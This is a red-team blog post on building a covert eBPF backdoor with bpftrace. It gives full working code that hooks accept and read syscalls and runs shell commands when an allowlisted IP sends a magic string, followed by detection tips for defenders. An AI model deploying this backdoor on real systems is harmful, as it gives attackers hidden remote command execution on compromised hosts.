---
title: "Offensive BPF - Malicious deeds with bpftrace"
date: 2021-10-01T08:00:58-07:00
draft: true
tags: [
        "pentest", "red","research","ebpf","blue"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Offensive BPF - Malicious deeds with bpftrace"
  description:  "Using eBPF in offensive security settings and mitigations"
  image: "https://embracethered.com/blog/images/2021/obpf.png"

---


![Offensive BPF](/blog/images/2021/offensive-bpf.png)

This post is part of a series about **Offensive BPF** that I'm working on to learn about BPF to understand attacks and defenses, click the ["ebpf"](/blog/tags/ebpf) tag to see all relevant posts.


# What is bpftrace 


`bpftrace` is a versatile tool used to create custom bpf programs without having to deal with too many low-level things. The [bpftrace's homepage](https://bpftrace.org/) calls it a "High-level tracing language for Linux systems", and it has a cute logo. 

It’s kind of **bpf Swiss army knife**.

My goal was to start at a higher level to learn BPF basics, grasp what is possible and where limitations are. `bpftrace` seems perfect for that. After building programs for a few days, I'm really getting the hang of it. 

![Offensive BPF](/blog/images/2021/pony.png)

Let's explore `bpftrace` in an offensive setting and how misuse can be detected.

## Installation

Performance and observability teams are pushing for tooling to be present in production. Due to its usefulness, this is likely going to increase.

For experimenting with `bpftrace` on your own Linux box [follow the instructions](https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#ubuntu-packages).

*Note: I also upgraded my Ubuntu machine to 21.04 (Kernel 5.11) to have all the latest features and debugging capabilities available, which ended up making my life a bit easier in learning BPF. But things will also work on a bit older versions.*

## Basic Example

Here is a basic "hello world" examples you see when learning about `bpftrace`:

```
sudo bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf("Hello, World: %s %s\n", comm, str(args->filename)) }
```

Can you guess what this is doing?

Let's look at the parameters:

1. `bpftrace` needs to run as `root`, or with `CAP_BPF` capabilities (used `sudo` here)
2. `-e`: defines the `bpftrace` program
3. `sys_enter_open` tracepoint is used to print `comm` (process name), and `args->filename` 

There are a couple of **magic variables** used, like `comm` and `args`.

[Here is cheat sheet](https://www.brendangregg.com/BPF/bpftrace-cheat-sheet.html) by Brendan Gregg that I frequently use to lookup variable names and other bpftrace features.

This example gives an idea how powerful BPF programs are. Imagine hooking passwords API calls or network traffic and observing or exfiltrating the data.

## Malicious deeds using system()

Naturally, I was also looking for a way to run shell commands and `bpftrace` conveniently has a `system()` command:

```
bpftrace --unsafe -e 'BEGIN { printf("Hello Offensive BPF!\n");  system("whoami"); }'
```

Notice that this requires the use of the `--unsafe` command line option.

**Detection Tip:** Look for any unsafe bpftrace usage.

**Caveat:** The string passed in to `system()` has to be a string literal and can't be a variable. This makes writing a generic command execution backdoor a little less straight forward – have some ideas now how to improve this – will be a separate post down the road.


# Building the backdoor using bpftrace

What can an adversary do? Let's dive into this a bit more.

1. Assume an adversary gained privileged access to a host. 
2. The adversary installs a `bpf` based TCP backdoor.
3. Now, whenever messages come from a certain IP (or source port) malicious commands are run
4. It does not matter what TCP service (HTTP, SSH, MySQL...) the client/attacker uses to trigger the backdoor 

It sounded simple and took me many hours (close to 3 days on and off) to figure out the very basics to get this going.

Let me share my learnings - this is also useful for anyone wanting to learn about BPF.

## Source port-based malware trigger

To keep it simple my first attempt was to use the source port information to awaken the `BPF` program. 

Let's say a packet comes in on port `6666`, then the BPF program wakes up and does malicious stuff.

Being quite motivated, I created a BPF program hooked up `kprope:tcp_connect` and added the following `if` clause:

```
if ( ((struct sock *) arg0)->__sk_common.skc_num == 6666) 
{  
    system("whoami >> /proc/1/root/tmp/result.txt"); 
}
```

When building more complex programs I found it better to store them in a file for easy editing. `bpftrace` programs typically have the `.bt` file extension.

The very first solution I came up with looked looks like this: 

```
#include <net/sock.h> 

BEGIN 
{ 
    printf("Welcome to Offensive BPF!\n"); 
} 

kprobe:tcp_connect 
{ 
    if ( ((struct sock *) arg0)->__sk_common.skc_num == 6666) 
    { 
        printf("backdoor call");
        system("whoami >> /proc/1/root/tmp/result.txt"); 
    }
}

END
{
    printf("Exiting. Bye.\n");
}
```

To run the BPF program I used `sudo bpftrace --unsafe obpf.bt`.

Indeed, this compiles and installs the BPF program into the kernel. Progress!

Now let's walk through the details:

1. `BEGIN`/`END`: Code that is run before and after. Here we just print a welcome and exit message.
2. Attach to `kprobe:tcp_connect` kernel probe. So, whenever a TCP connection happens this program will run
3. Using `struct sock *` (from the imported header file) to read the source port 
4. Only if the source port is `6666` the `system` command will run and write the result to disk 

For testing, netcat (`nc`) allows you to specify the source port via the `-p` option, as follows:

```
nc -vv 192.168.0.12 8888 -p 6666
```
 
I was excited when this worked on the server side and triggered the BPF program. Pretty cool! 

There was one problem though...

This worked inside the local network but failed as soon as things traverse networks and NATs as source port can change.

# Building a message-based trigger

What I really wanted is some kind of message-based trigger that runs when a "secret backdoor message" arrives on any port.

This is where I started learning a lot... 

I spent time reading Linux source code and how TCP parsing works with `struct msghdr *` and related data structures. It's all a bit convoluted. 

Searching through hook points with `bpftrace` identified a point of interest.

```
$ sudo bpftrace -lv 'tracepoint:*enter_read' 
BTF: using data from /sys/kernel/btf/vmlinux
tracepoint:syscalls:sys_enter_read
    int __syscall_nr;
    unsigned int fd;
    char * buf;
    size_t count;
```

About the command line options:

* `-l`:  lists all the tracepoints, kprobes, uprobes that match provided string
* `*`: Awesome: You can also use `*` as wildcards in the search
* `-v`: shows data structures details (very useful). This didn't work before upgrading to a very recent Ubuntu version

I wanted to read and print the `char * buf`. But when coding this, `sys_enter_read` gets called BUT that buffer is not yet filled with data - so how to access the data?

## Grasping "Enter" and "Exit" tracing to read buffers

It took me a bit to grasp how enter and exit tracepoints work in unison to achieve the desired result. 

In retrospect it seems obvious, but for anyone starting this explanation should help:

Exit tracepoints (e.g. `sys_exit_read`) don't have access to the arguments passed into the function. 

This puzzled me for a while... 

The way to handle this is to use the `sys_enter_read` hook **to store a pointer to the buffer in a thread local variable**. Then use the `sys_exit_read` hook **to read that pointer** again.

In the exit hook the buffer (in this case `buf`) is filled with the data. The `sys_exit_*` functions have a `ret` value that tells you about the length of the buffer to read.

After figuring that out, everything fell into place, and I made quick progress.

Here is what this means in `bpftrace` code:

```
tracepoint:syscalls:sys_enter_read
{ 
     @sys_read[tid] = args->buf;
}
```

This stores the `buf` pointer in `@variable[tid]`. In this case I named the varialble `@sys_read`.

Then in `sys_exit_read` the pointer is extracted, and we read the buffer as string.

```
tracepoint:syscalls:sys_exit_read
/ @sys_read[tid] /   
{ 
  $cmd = str(@sys_read[tid], args->ret);
  printf("<-sys_exit_read(tid:%d): len: %d, buf: %s\n", tid, args->ret, $cmd);
  
  if ($cmd == "OhhhBPF!\n")
  {   
    system("whoami >> /proc/1/root/tmp/o");
  }

  printf("<-sys_exit_read(tdi:%d): Done.\n", tid);
}
```

If the content of the buffer (now in variable `$cmd`) contains the word "`OhhhBPF!\n`" the program will run a simple `whoami` and store the result in a file. Notice the file path, using that namespace is another thing that took me quite a while to figure out.

### Applying a Filter

A new concept in this example is applying a `filter` by using `/ @sys_read[tid] /`. This filters only calls that are relevant. If you want to filter by a certain process name specify it like: `/ comm="nc" /`
 
But that's it. At this point the program works as intended!


## Improvements: Tracing only socket reads!

At that point reading buffers worked. It is noisy because all the `reads()` syscalls are traced, even though only socket connections are of interest.

There is probably a better way to do this, but with the newly acquired `bcptrace` chops, I thought to:

* Hook the socket `accept` call via the `syscalls:sys_enter_accept4` trace point. I learned about by the correct method to trace (`accept4`) by observing the systems calls of a `netcat` server, by running: `strace nc -lkv 20000` 
* Add an IP address allow check to only allow a specific IP to cause the trigger
* Store the file descriptor `fd` during `accept` in `@sys_accept[tid]` - so we keep track of which `fd` came from a socket
* Update the `sys_enter_read` to ensure the read's file descriptor matches the one we stored

This the resulting code:

```
#include <net/sock.h>

BEGIN
{
    printf("Welcome to Offensive BPF... Use Ctrl-C to exit.\n");
}

tracepoint:syscalls:sys_enter_accept4 
{ 
  printf("->accept: Comm: %s, Allowed IP: %u", comm, $1 );

  $sk4=(struct sockaddr_in  *) args->upeer_sockaddr; 
  if ($sk4->sin_family == AF_INET) 
  { 
    $ip4 = $sk4->sin_addr;
    if ($ip4 == 123456789) # whitelisted IP as int
    {
      printf("->accept: *IPv4: fd:%d -- %s\n", args->fd, ntop($ip4) ); 
      @sys_accept[tid] = args->fd;  
    }
  } 
}

tracepoint:syscalls:sys_enter_read
{ 
  //only trace inet fd's
  if (args->fd == (uint64) @sys_accept[tid])
  {
     @sys_read[tid] = args->buf;
  }   
}

tracepoint:syscalls:sys_exit_read
/ @sys_read[tid] /   
{ 
  $cmd = str(@sys_read[tid], args->ret);
  printf("<-sys_exit_read(tid:%d): len: %d, buf: %s\n", tid, args->ret, $cmd);
  
  if ($cmd == "OhhhBPF: whoami\n")
  {   
    system("whoami >> /proc/1/root/tmp/o");
  }
 
  printf("<-sys_exit_read(tdi:%d): Done.\n", tid);
}

END
{
    clear(@sys_read);
    clear(@sys_accept);
    printf("Exiting. Bye.\n");
}
```

After these changes the program works well, and without noise!

## BPF Backdoor in Action

After launching the BPF program on the compromised server, connecting to any port that is exposed on the server, and sending the "magic string" will run the backdoor program!

Mind blown!

In my final BPF program that will be used in Red Team Operations I added a couple more features to run more commands and exfiltrate files via a secure side channel - not publishing features now. Maybe in an upcoming post.

# Detections

There are a set of detection ideas for Blue Teams. 

## Collecting Telemetry

Getting the telemetry around BPF syscalls is a crucial to getting insights into its usage across the fleet.

## Inspecting loaded BPF programs

Loaded BPF programs can be inspected via the `bpftool`.

For instance, `bpftool prog` will show you the details and you can see the malicious backdoor one-liner we used shows up:

![BPF prog output](/blog/images/2021/bpfprog.png)

## --unsafe bpftrace usage and `system` calls

The usage of a `system()` call seems very unusual. So looking for command line logs that contain `bpftrace --unsafe` seems a good way to catch **dangerous** bpf programs also.

## Persistence

BPF programs don't survive a reboot, so an adversary will try to restart them (cron jobs, etc..). Be on the lookout!

**There is also the attack avenue to backdoor existing programs that performance teams use or that are executed regularly on hosts.**  I haven't seen any signature validation approaches yet, which could help detect such changes.

# Hooking the BPF system call itself!

A nifty attacker will likely hook the `bpf()` system call itself to change blue teams reality - this is something I want to explore in a future post.


# Conclusion

Hope this second post in the series was useful from a more technical perspective and gives some ideas on what defenders need to start looking out for. I'm confident that BPF malware will be quite common in the not-so-distant future, so let’s get a step ahead.

Twitter: [@wunderwuzzi23](https://twitter.com/wunderwuzzi23)

# Resources

* [BPF syscall](https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html)
* [BPF Documentation](https://www.kernel.org/doc/html/latest/bpf/index.html)
* [bpftrace install instructions](https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#ubuntu-packages)
* [bpftrace Homepage](https://bpftrace.org)
